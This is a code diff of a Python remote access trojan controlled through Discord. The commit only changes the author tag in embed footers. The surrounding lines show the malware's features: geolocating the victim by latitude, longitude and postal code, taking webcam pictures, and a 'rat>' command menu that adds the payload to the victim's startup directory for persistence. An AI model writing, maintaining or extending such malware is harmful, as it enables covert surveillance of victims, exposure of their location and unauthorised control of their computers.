@@ -35,7 +35,7 @@ def EmbedGen(title_main, color, name, value):
         color2 = color
     embed = discord.Embed(title=title_main, color=color)
     embed.add_field(name=name, value=value)
-    embed.set_footer(text="Written by NullCode#7040")
+    embed.set_footer(text="Written by NullCode#1337")
     return embed
 
 def ft(p):
@@ -106,7 +106,7 @@ async def geolocate(ctx):
     embed.add_field(name="Latitude", value=data["latitude"], inline=True)
     embed.add_field(name="Longitude", value=data["longitude"], inline=True)
     embed.add_field(name="Postal code", value=data["postal"], inline=True)
-    embed.set_footer(text="Written by NullCode#7040")
+    embed.set_footer(text="Written by NullCode#1337")
     await ctx.send(embed=embed)
 
 # Put payload in startup directory
@@ -330,7 +330,7 @@ async def menu(ctx):
     embed.add_field(name="rat> webcam", value="Takes picture from webcam", inline=False)
     embed.add_field(name="rat> startup", value="Add payload to victim's startup", inline=False)
     embed.add_field(name="rat> exit <ip>", value="Shuts down bot", inline=False)
-    embed.set_footer(text="Written by NullCode#7040")
+    embed.set_footer(text="Written by NullCode#1337")
     await ctx.send(embed=embed)
 
 while is_connected() == False: a += 1
